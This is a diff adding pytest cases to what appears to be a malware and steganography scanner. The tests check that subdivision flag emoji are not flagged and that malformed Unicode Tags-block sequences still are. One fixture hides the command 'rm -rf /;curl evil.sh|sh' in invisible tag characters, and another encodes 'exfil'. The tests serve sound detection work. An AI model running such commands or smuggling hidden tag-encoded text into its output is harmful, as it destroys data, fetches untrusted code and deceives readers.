@@ -400,6 +400,73 @@ def test_unicode_steganography_ignores_single_emoji_presentation_selector(lens):
     assert counts.get("unicode_steganography", 0) == 0, "Hallucinated steganography on ordinary emoji text!"
 
 
+# Emoji subdivision flags (#4135): U+1F3F4 WAVING BLACK FLAG + a CLDR subdivision id
+# spelled in Unicode TAG codepoints + U+E007F CANCEL TAG.
+_BLACK_FLAG = "\U0001f3f4"
+_CANCEL_TAG = "\U000e007f"
+
+
+def _tags(text):
+    """Spell ASCII text in Unicode Tags-block codepoints (U+E0000 + codepoint)."""
+    return "".join(chr(0xE0000 + ord(ch)) for ch in text)
+
+
+def _flag(subdivision_id):
+    return _BLACK_FLAG + _tags(subdivision_id) + _CANCEL_TAG
+
+
+@pytest.mark.parametrize("subdivision_id", ["gbeng", "gbsct", "gbwls"])
+def test_unicode_steganography_ignores_subdivision_flag_tag_sequences(lens, subdivision_id):
+    """
+    [FALSE POSITIVE DEFENSE] (#4135) The England/Scotland/Wales flags are a run of
+    six Tags-block codepoints, but a well-formed emoji tag sequence -- U+1F3F4, then
+    3-7 lowercase-letter/digit tags, then U+E007F -- is benign text (V8, flutter,
+    excalidraw and symfony all carry them in tests and emoji tables).
+    """
+    flag = _flag(subdivision_id)
+    content = f'const flag = "{flag}";\nconst both = ["{flag}", "{flag}️"];\nlabel = "{flag}{_flag("usca")}"\n'
+
+    counts = lens.scan_content(content)["counts"]
+
+    assert counts.get("unicode_steganography", 0) == 0, f"Flag {subdivision_id!r} flagged as smuggling"
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        pytest.param(_tags("gbeng") + _CANCEL_TAG, id="tags-without-flag-base"),
+        pytest.param("x" + _tags("gbeng") + _CANCEL_TAG, id="tags-after-ordinary-char"),
+        pytest.param(_BLACK_FLAG + _tags("gbeng"), id="flag-missing-cancel-tag"),
+        pytest.param(_BLACK_FLAG + _tags("GBENG") + _CANCEL_TAG, id="uppercase-tags"),
+        pytest.param(_BLACK_FLAG + _tags("gb-en") + _CANCEL_TAG, id="punctuation-tag"),
+        pytest.param(_BLACK_FLAG + _tags("gbengland") + _CANCEL_TAG, id="overlong-subdivision-id"),
+        pytest.param(_BLACK_FLAG + _tags("rm -rf /;curl evil.sh|sh") + _CANCEL_TAG, id="ascii-payload-in-flag"),
+        pytest.param(_flag("gbeng") + _tags("payload"), id="payload-trailing-flag"),
+        pytest.param(_flag("gbeng") + "️️️", id="selectors-trailing-flag"),
+        pytest.param(_flag("gbeng") + "\U000e0101\U000e0102\U000e0103", id="vs-supplement-trailing-flag"),
+        pytest.param(_BLACK_FLAG + "\U000e0101\U000e0102\U000e0103" + _CANCEL_TAG, id="vs-supplement-after-flag"),
+    ],
+)
+def test_unicode_steganography_still_fires_on_tag_smuggling(lens, payload):
+    """
+    [DETECTION] (#4135) The flag exemption is tight: Tags-block runs with no U+1F3F4
+    base, malformed or overlong ids, a missing CANCEL TAG, or extra invisible
+    codepoints riding after a real flag all still count as smuggling.
+    """
+    counts = lens.scan_content(f'const s = "{payload}";\n')["counts"]
+
+    assert counts.get("unicode_steganography", 0) == 1, "Tag-block smuggling slipped through the flag exemption"
+
+
+def test_unicode_steganography_counts_smuggling_next_to_a_benign_flag(lens):
+    """[DETECTION] (#4135) A benign flag on the same line does not mask a separate payload run."""
+    content = f'const s = "{_flag("gbsct")} hi {_tags("exfil")}";\n'
+
+    counts = lens.scan_content(content)["counts"]
+
+    assert counts.get("unicode_steganography", 0) == 1
+
+
 def test_self_propagation_detects_self_copy_and_self_overwrite(lens):
     """
     [DETECTION] A worm's defining mechanical trait is duplicating or overwriting
